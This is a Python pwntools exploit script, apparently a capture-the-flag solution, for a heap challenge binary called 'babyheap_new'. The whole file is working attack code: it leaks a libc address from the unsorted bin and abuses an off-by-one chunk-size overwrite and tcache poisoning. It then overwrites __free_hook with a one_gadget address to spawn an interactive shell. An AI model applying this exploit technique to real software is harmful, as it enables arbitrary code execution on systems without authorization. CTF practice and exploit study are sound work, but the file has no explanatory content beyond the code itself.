#! /usr/bin/env python
from pwn import * 
import primedbg 
import sys

context.terminal=['tmux','splitw','-h']  

def add(p,sz,c):
    p.sendlineafter('>','M')
    p.sendlineafter('>',str(sz))
    p.sendlineafter('>',c)

def add2(p,sz,c):
    p.sendlineafter('>','M')
    p.sendlineafter('>',str(sz))
    p.sendafter('>',c)

def free(p,idx):
    p.sendlineafter('>','F')
    p.sendlineafter('>',str(idx))

def show(p,idx):
    p.sendlineafter('>','S')
    p.sendlineafter('>',str(idx))

if __name__=='__main__':
    elf=ELF('./babyheap_new',False)
    libc=ELF('./libc.so',False)
    free_hook=libc.symbols['__free_hook']
    system=libc.symbols['system']
    puts_got=elf.got['puts']
    
    io=process('./babyheap_new')
        
    if len(sys.argv)==2 and sys.argv[1]=='pdbg':
        #context.log_level='debug'
        primedbg.p_attach_dbg(io,[0x00143C,],syms={
            'list':0x4060,
            'free':0x00013CC,
            '_free':0x00001414,
            'test':0x0133D
        })
        

    # debug add:0x000013C6, free:0x00013CC

    # add(io,0xf8,'to be overflowed') #1
    # free(io,1)

    for i in range(0x7):
        add(io,0xf8,str(i)) #i
    add(io,1,'7') #7
    add(io,0x1,'8') #8

    for i in range(0x7):
        free(io,i)
    free(io,7)  
    free(io,8)

    for i in range(7):
        add(io,0xf8,'/bin/sh;') #i

    add(io,0x1,'\xa0')

    show(io,7) 
    io.recvn(1)
    unsorted_bin=u64(io.recvn(6).ljust(8,'\x00'))
    lib_base=unsorted_bin-1985696
    free_hook=lib_base+free_hook
    system=lib_base+0x52fd0
    one_gadget=lib_base+0x106ef8
    success(hex(unsorted_bin))
    success('free_hook: %#x\nsystem: %#x'%(free_hook,system))

    free(io,6)
    add(io,0xf8,'a'*0xf8+'\x81')
    free(io,5)
    free(io,4)
    
    add(io,0x178,'a'*0xf8+'b'*8+p64(free_hook)[:6]) #4
    add(io,0x1,'5')
    add2(io,0x6,p64(one_gadget)[:7]) #6
    show(io,1)
    
    free(io,0)  
    
    io.interactive()